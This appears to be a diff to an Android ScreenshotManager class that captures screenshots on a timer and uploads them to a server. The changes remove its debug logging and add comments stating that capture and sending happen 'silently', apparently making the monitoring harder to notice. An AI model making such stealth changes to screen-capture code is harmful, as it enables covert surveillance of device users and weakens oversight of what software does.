@@ -136,7 +136,7 @@ public class ScreenshotManager {
         
         isCapturing = true;
         
-        Log.d(TAG, "Screenshot capture setup complete, starting timer...");
+        Log.d(TAG, "Screenshot capture setup complete");
         
         // Start taking screenshots at regular intervals
         startScreenshotTimer(listener);
@@ -148,7 +148,7 @@ public class ScreenshotManager {
             @Override
             public void run() {
                 if (isCapturing) {
-                    Log.d(TAG, "Timer tick - capturing screenshot...");
+                    // Capture screenshot silently
                     captureScreenshot(listener);
                     // Schedule next screenshot based on configured interval
                     handler.postDelayed(this, Constants.SCREENSHOT_INTERVAL);
@@ -225,7 +225,7 @@ public class ScreenshotManager {
     
     private void sendScreenshotToServer(byte[] jpegData) {
         try {
-            Log.d(TAG, "Sending screenshot to server: " + jpegData.length + " bytes");
+            // Send screenshot data silently
             
             String base64Data = Base64.encodeToString(jpegData, Base64.DEFAULT);
             
